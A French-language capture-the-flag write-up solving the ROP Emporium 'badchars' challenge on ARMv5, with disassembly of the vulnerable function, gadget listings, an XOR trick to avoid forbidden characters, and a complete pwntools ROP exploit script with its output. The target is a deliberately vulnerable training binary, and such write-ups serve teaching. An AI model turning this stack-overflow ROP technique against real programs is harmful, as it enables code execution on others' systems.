---
Title: Ropemporium ARMv5 badchars
Date: 2023-06-25
Tags: [linux, python, ROP, ARMv5, ropemporium, write-up]
Categories: [tutorial]
Author: cdpointpoint
Draft: False
---

# armv5 badchars

## Introduction

Dans cet exercice on doit appeller une fonction avec en paramètre une chaine de caractère péalablement écrite en mémoire comme pour le précédant mais certains caractères sont interdits.


Ennoncé sur le site ropemporium : [badchars](https://ropemporium.com/challenge/badchars.html)


## Découverte

### Contenu

    -rwxr-xr-x 1 jce jce  8252 10 juil.  2020 badchars_armv5
    -rwxr-xr-x 1 jce jce  8272 19 juil.  2021 badchars_armv5-hf
    -rw-r--r-- 1 jce jce 11546 19 juil.  2021 badchars_armv5.zip
    -rw-r--r-- 1 jce jce    33  2 juil.  2020 flag.txt
    -rwxr-xr-x 1 jce jce  7852 19 juil.  2021 libbadchars_armv5-hf.so
    -rwxr-xr-x 1 jce jce  7840 10 juil.  2020 libbadchars_armv5.so

### Execution du programme avec qemu

    armv5/05_badchars$ qemu-arm badchars_armv5
    badchars by ROP Emporium
    ARMv5

    badchars are: 'x', 'g', 'a', '.'
    > aaaaaaaaaaaaaaaaaaaaaaaaaaaa
    Thank you!

## Analyse


### Le programe principal

            ;-- usefulGadgets:
            0x000105f0      001095e5       ldr r1, [r5]
            0x000105f4      061041e0       sub r1, r1, r6
            0x000105f8      001085e5       str r1, [r5]
            0x000105fc      0180bde8       pop {r0, pc}

            0x00010600      001095e5       ldr r1, [r5]
            0x00010604      061081e0       add r1, r1, r6
            0x00010608      001085e5       str r1, [r5]
            0x0001060c      0180bde8       pop {r0, pc}

            0x00010610      003084e5       str r3, [r4]
            0x00010614      6080bde8       pop {r5, r6, pc}

            0x00010618      001095e5       ldr r1, [r5]
            0x0001061c      061021e0       eor r1, r1, r6
            0x00010620      001085e5       str r1, [r5]
            0x00010624      0180bde8       pop {r0, pc}


### La libraire libbadchars.so

    ┌ 332: sym.pwnme ();
    │           ; var int32_t var_3ch @ fp-0x3c
    │           ; var void *buf @ fp-0x38
    │           ; var int32_t var_34h @ fp-0x34
    │           ; var int32_t var_ch @ fp-0xc
    │           ; var int32_t var_sp_ch @ sp+0x24
    │           ; var int32_t var_8h @ sp+0x28
    │           0x00000714      10482de9       push {r4, fp, lr}
    │           0x00000718      08b08de2       add fp, var_ch
    │           0x0000071c      34d04de2       sub sp, sp, 0x34
    │           0x00000720      38419fe5       ldr r4, [0x00000860]        ; [0x860:4]=0x108d4
    │           0x00000724      04408fe0       add r4, pc, r4              ; 0x11000 ; " \x0f\x01"
    │           0x00000728      34319fe5       ldr r3, aav.0x00000048      ; [0x864:4]=72
    │           0x0000072c      033094e7       ldr r3, [r4, r3]            ; stdout;
    │           0x00000730      000093e5       ldr r0, [r3]                ; FILE*stream
    │           0x00000734      0030a0e3       mov r3, 0
    │           0x00000738      0220a0e3       mov r2, 2
    │           0x0000073c      0010a0e3       mov r1, 0                   ; char *buf
    │           0x00000740      a1ffffeb       bl sym.imp.setvbuf          ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
    │           0x00000744      1c319fe5       ldr r3, aav.0x000001d8      ; [0x868:4]=472
    │           0x00000748      03308fe0       add r3, pc, r3              ; 0x928 ; "badchars by ROP Emporium"
    │           0x0000074c      0300a0e1       mov r0, r3                  ; 0x928 ; "badchars by ROP Emporium" ; const char *s
    │           0x00000750      94ffffeb       bl sym.imp.puts             ; int puts(const char *s)
    │           0x00000754      10319fe5       ldr r3, aav.0x000001e4      ; [0x86c:4]=484
    │           0x00000758      03308fe0       add r3, pc, r3              ; 0x944 ; "ARMv5\n"
    │           0x0000075c      0300a0e1       mov r0, r3                  ; 0x944 ; "ARMv5\n" ; const char *s
    │           0x00000760      90ffffeb       bl sym.imp.puts             ; int puts(const char *s)
    │           0x00000764      3c304be2       sub r3, fp, 0x3c
    │           0x00000768      103083e2       add r3, buf
    │           0x0000076c      2020a0e3       mov r2, 0x20
    │           0x00000770      0010a0e3       mov r1, 0                   ; int c
    │           0x00000774      0300a0e1       mov r0, r3                  ; void *s
    │           0x00000778      96ffffeb       bl sym.imp.memset           ; void *memset(void *s, int c, size_t n)
    │           0x0000077c      ec309fe5       ldr r3, aav.0x000001c4      ; [0x870:4]=452
    │           0x00000780      03308fe0       add r3, pc, r3              ;
    │           0x00000784      0300a0e1       mov r0, r3                  ; 0x94c ; "badchars are: 'x', 'g', 'a', '.'" ; const char *s
    │           0x00000788      86ffffeb       bl sym.imp.puts             ; int puts(const char *s)
    │           0x0000078c      e0309fe5       ldr r3, aav.0x000001d8      ; [0x874:4]=472
    │           0x00000790      03308fe0       add r3, pc, r3              ; 0x970 ; "> "
    │           0x00000794      0300a0e1       mov r0, r3                  ; 0x970 ; "> " ; const char *format
    │           0x00000798      76ffffeb       bl sym.imp.printf           ; int printf(const char *format)
    │           0x0000079c      3c304be2       sub r3, fp, 0x3c
    │           0x000007a0      103083e2       add r3, buf
    │           0x000007a4      022ca0e3       mov r2, str._               ; 0x200
    │           0x000007a8      0310a0e1       mov r1, r3                  ; void *buf
    │           0x000007ac      0000a0e3       mov r0, 0                   ; int fildes
    │           0x000007b0      76ffffeb       bl sym.imp.read             ; ssize_t read(int fildes, void *buf, size_t nbyte)
    │           0x000007b4      0030a0e1       mov r3, r0
    │           0x000007b8      3c300be5       str r3, [var_3ch]           ; aav.0x0000003c
    │           0x000007bc      0030a0e3       mov r3, 0
    │           0x000007c0      38300be5       str r3, [buf]               ; aav.0x00000038
    │       ┌─< 0x000007c4      1a0000ea       b 0x834
    │       │   ; CODE XREF from sym.pwnme @ 0x840
    │      ┌──> 0x000007c8      0030a0e3       mov r3, 0
    │      ╎│   0x000007cc      34300be5       str r3, [var_34h]           ; elf_phdr
    │      ╎│                                                              ; 0x34
    │     ┌───< 0x000007d0      110000ea       b 0x81c
    │     │╎│   ; CODE XREF from sym.pwnme @ 0x824
    │    ┌────> 0x000007d4      38301be5       ldr r3, [buf]               ; aav.0x00000038
    │    ╎│╎│                                                              ; 0x38
    │    ╎│╎│   0x000007d8      0c204be2       sub r2, var_sp_ch
    │    ╎│╎│   0x000007dc      033082e0       add r3, r2, r3
    │    ╎│╎│   0x000007e0      202053e5       ldrb r2, [buf]
    │    ╎│╎│   0x000007e4      34301be5       ldr r3, [var_34h]           ; elf_phdr
    │    ╎│╎│                                                              ; 0x34
    │    ╎│╎│   0x000007e8      88109fe5       ldr r1, aav.0x00000040      ; [0x878:4]=64
    │    ╎│╎│   0x000007ec      011094e7       ldr r1, [r4, r1]            ; 0x11040
    │    ╎│╎│                                                              ; reloc.badcharacters
    │    ╎│╎│   0x000007f0      0330d1e7       ldrb r3, [r1, r3]
    │    ╎│╎│   0x000007f4      030052e1       cmp r2, r3
    │   ┌─────< 0x000007f8      0400001a       bne 0x810
    │   │╎│╎│   0x000007fc      38301be5       ldr r3, [buf]               ; aav.0x00000038
    │   │╎│╎│                                                              ; 0x38
    │   │╎│╎│   0x00000800      0c204be2       sub r2, var_sp_ch
    │   │╎│╎│   0x00000804      033082e0       add r3, r2, r3
    │   │╎│╎│   0x00000808      1420e0e3       mvn r2, 0x14
    │   │╎│╎│   0x0000080c      202043e5       strb r2, [buf]
    │   │╎│╎│   ; CODE XREF from sym.pwnme @ 0x7f8
    │   └─────> 0x00000810      34301be5       ldr r3, [var_34h]           ; elf_phdr
    │    ╎│╎│                                                              ; 0x34
    │    ╎│╎│   0x00000814      013083e2       add r3, r3, 1               ; "ELF\x01\x01\x01"
    │    ╎│╎│   0x00000818      34300be5       str r3, [var_34h]           ; elf_phdr
    │    ╎│╎│                                                              ; 0x34
    │    ╎│╎│   ; CODE XREF from sym.pwnme @ 0x7d0
    │    ╎└───> 0x0000081c      34301be5       ldr r3, [var_34h]           ; elf_phdr
    │    ╎ ╎│                                                              ; 0x34
    │    ╎ ╎│   0x00000820      030053e3       cmp r3, 3                   ; aav.0x00000003 ; "F\x01\x01\x01"
    │    └────< 0x00000824      eaffff9a       bls 0x7d4
    │      ╎│   0x00000828      38301be5       ldr r3, [buf]               ; aav.0x00000038
    │      ╎│                                                              ; 0x38
    │      ╎│   0x0000082c      013083e2       add r3, r3, 1               ; "ELF\x01\x01\x01"
    │      ╎│   0x00000830      38300be5       str r3, [buf]               ; aav.0x00000038
    │      ╎│                                                              ; 0x38
    │      ╎│   ; CODE XREF from sym.pwnme @ 0x7c4
    │      ╎└─> 0x00000834      38201be5       ldr r2, [buf]               ; aav.0x00000038
    │      ╎                                                               ; 0x38
    │      ╎    0x00000838      3c301be5       ldr r3, [var_3ch]           ; aav.0x0000003c
    │      ╎                                                               ; 0x3c
    │      ╎    0x0000083c      030052e1       cmp r2, r3
    │      └──< 0x00000840      e0ffff3a       blo 0x7c8
    │           0x00000844      30309fe5       ldr r3, aav.0x00000124      ; [0x87c:4]=292
    │           0x00000848      03308fe0       add r3, pc, r3              ; 0x974 ; "Thank you!"
    │           0x0000084c      0300a0e1       mov r0, r3                  ; 0x974 ; "Thank you!" ; const char *s
    │           0x00000850      54ffffeb       bl sym.imp.puts             ; int puts(const char *s)
    │           0x00000854      0000a0e1       mov r0, r0                  ; 0x974 ; "Thank you!"
    │           0x00000858      08d04be2       sub sp, var_8h
    └           0x0000085c      1088bde8       pop {r4, fp, pc}

Lecture du message

    │           ; var void *buf @ fp-0x38
    │           0x0000079c      3c304be2       sub r3, fp, 0x3c
    │           0x000007a0      103083e2       add r3, buf
    │           0x000007a4      022ca0e3       mov r2, str._               ; 0x200
    │           0x000007a8      0310a0e1       mov r1, r3                  ; void *buf
    │           0x000007ac      0000a0e3       mov r0, 0                   ; int fildes
    │           0x000007b0      76ffffeb       bl sym.imp.read             ; read(int fildes, void *buf, size_t nbyte)

Le déassemblage de gdb est au final plus clair

    0x3ffc079c <+136>:   sub     r3, r11, #60    @ 0x3c
    0x3ffc07a0 <+140>:   add     r3, r3, #16
    0x3ffc07a4 <+144>:   mov     r2, #512        @ 0x200
    0x3ffc07a8 <+148>:   mov     r1, r3
    0x3ffc07ac <+152>:   mov     r0, #0
    0x3ffc07b0 <+156>:   bl      0x3ffc0590 <read@plt>

En fait au moment du call : r1 = r11 -0x3c + 0x10 = fp - 0x2c

Et si on regarde le début de la fonction

    0x3ffc0714 <+0>:     push    {r4, r11, lr}
    0x3ffc0718 <+4>:     add     r11, sp, #8
    0x3ffc071c <+8>:     sub     sp, sp, #52     @ 0x34

On voit que r11 = fp = sp+8 avant la création de la pile locale.

Le buffer de lecture est donc à un offset 0x24 du début de la pile.


## Construction de l'attaque

### Le plan


On va d'abord écrire "flag.txt" avec les caractères interdits modifié par une xor.
Puis xorer de nouveau chaque caractère en mémoire pour obtenir la valeur initiale.

Ce qui nous donne avec un `xor 3` : 'flbd-t{t'.


### Recherche de gadgets

Un gadget xor :

    05_badchars# ROPgadget --binary badchars_armv5 --depth 4|grep eor
    0x0001061c : eor r1, r1, r6 ; str r1, [r5] ; pop {r0, pc}
    0x00010618 : ldr r1, [r5] ; eor r1, r1, r6 ; str r1, [r5] ; pop {r0, pc}

Le second gadget est ce qu'il nous faut.

En chargeant `r5` avec une adresse et `r6` avec un masque le contenu de `r5` est xoré.


Gadget d'écriture :

    05_badchars# ROPgadget --binary badchars_armv5 --depth 4|grep str
    0x00010604 : add r1, r1, r6 ; str r1, [r5] ; pop {r0, pc}
    0x000105a4 : bl #0x1052c ; mov r3, #1 ; strb r3, [r4] ; pop {r4, pc}
    0x0001061c : eor r1, r1, r6 ; str r1, [r5] ; pop {r0, pc}
    0x00010600 : ldr r1, [r5] ; add r1, r1, r6 ; str r1, [r5] ; pop {r0, pc}
    0x00010618 : ldr r1, [r5] ; eor r1, r1, r6 ; str r1, [r5] ; pop {r0, pc}
    0x000105f0 : ldr r1, [r5] ; sub r1, r1, r6 ; str r1, [r5] ; pop {r0, pc}
    0x000105a8 : mov r3, #1 ; strb r3, [r4] ; pop {r4, pc}
    0x0001060c : pop {r0, pc} ; str r3, [r4] ; pop {r5, r6, pc}
    0x000105f8 : str r1, [r5] ; pop {r0, pc}
    0x00010608 : str r1, [r5] ; pop {r0, pc} ; str r3, [r4] ; pop {r5, r6, pc}
    0x00010610 : str r3, [r4] ; pop {r5, r6, pc}
    0x000105ac : strb r3, [r4] ; pop {r4, pc}
    0x000105f4 : sub r1, r1, r6 ; str r1, [r5] ; pop {r0, pc}

On retient le plus simple

    0x00010610 : str r3, [r4] ; pop {r5, r6, pc}


    0x00010614 : pop {r5, r6, pc}
    0x00010478 : pop {r3, pc}
    0x000105b0 : pop {r4, pc}

    0x00010690 : pop {r3, pc}


### La chaîne de ROP

| ROP entry | comment |
| ----------- | ------- |
| 0 | pour pop r4 de la fin de fonction |
| 0 | pour pop r11 de la fin de fonction |
| 0x00010690 | pop {r3, pc} |


## Exploitation

### Le script python

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# Set up pwntools for the correct architecture
elf = context.binary = ELF('badchars_armv5')

#context.terminal=["tmux", "splitw", "-h"]
context.terminal=["/usr/bin/xterm", "-fa", "Monospace", "-fs","12", "-e"]

# 156 : read
# 328 : ret
gs='''
b *pwnme+156
b *pwnme+328
c
'''

def xorchain(chain, bytes, mask):
    r=b""
    for i,c in enumerate(chain):
        if bytes&0x80:
            c=c^mask
        r+=chr(c).encode()
        bytes= bytes<<1
    return r



g_pop_r3 = 0x00010690
g_pop_r4 = 0x000105b0
g_pop_r5r6 = 0x10614

# str r3, [r4] ; pop {r3, r4, pc}
g_str_r3r4 = 0x000105ec

# 0x00010610 : str r3, [r4] ; pop {r5, r6, pc}
g_str_r3r4 = 0x00010610
# pop {r0, pc}
g_pop_r0 = 0x000105f4

# 0x00010618 : ldr r1, [r5] ; eor r1, r1, r6 ; str r1, [r5] ; pop {r0, pc}
g_xor_r5r6 = 0x00010618

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])

data = elf.get_section_by_name('.data').header['sh_addr']
print_file = elf.plt['print_file']
main=elf.symbols['main']

io.recvuntil(b"> ")


offset=0x24

flagxored = xorchain(b"flag.txt",0b00111010,3)
log.info(f"flagxored    = {flagxored}")
log.info(f".data       = 0x{data:x}")
log.info(f".print_file = 0x{print_file:x}")


PL=b"A"*offset
# Ecriture de flag.txt xor 3
#
PL+=p32(4)           # r4
PL+=p32(5)           # r11
PL+=p32(g_pop_r3)    # r3 <=
PL+=flagxored[:4]

PL+=p32(g_pop_r4)    # r4 <= data
PL+=p32(data)
PL+=p32(g_str_r3r4)
PL+=p32(5)           # r5
PL+=p32(6)           # r6
PL+=p32(g_pop_r3)
PL+=flagxored[4:8]
PL+=p32(g_pop_r4)
PL+=p32(data+4)
PL+=p32(g_str_r3r4)
PL+=p32(data+2)  # r5
PL+=p32(3)       # r6

# sequence de xor
PL+=p32(g_xor_r5r6)
PL+=p32(0)       # r0

PL+=p32(g_pop_r5r6)
PL+=p32(data+3)  # r5
PL+=p32(3)       # r6
PL+=p32(g_xor_r5r6)
PL+=p32(0)       # r0

PL+=p32(g_pop_r5r6)
PL+=p32(data+4)  # r5
PL+=p32(3)       # r6
PL+=p32(g_xor_r5r6)
PL+=p32(0)       # r0

PL+=p32(g_pop_r5r6)
PL+=p32(data+6)  # r5
PL+=p32(3)       # r6
PL+=p32(g_xor_r5r6)
PL+=p32(data)       # r0

PL+=p32(print_file)
PL+=p32(main)


io.sendline(PL)
io.interactive()
```

### Execution du script

    [*] '/w/ropemporium/armv5/05_badchars/badchars_armv5'
        Arch:     arm-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x10000)
        RUNPATH:  b'.'
    [+] Starting local process '/w/ropemporium/armv5/05_badchars/badchars_armv5': pid 1459
    [*] flagxored    = b'flbd-t{t'
    [*] .data       = 0x21024
    [*] .print_file = 0x104b4
    [*] Switching to interactive mode
    Thank you!
    ROPE{a_placeholder_32byte_flag!}
    [*] Got EOF while reading in interactive
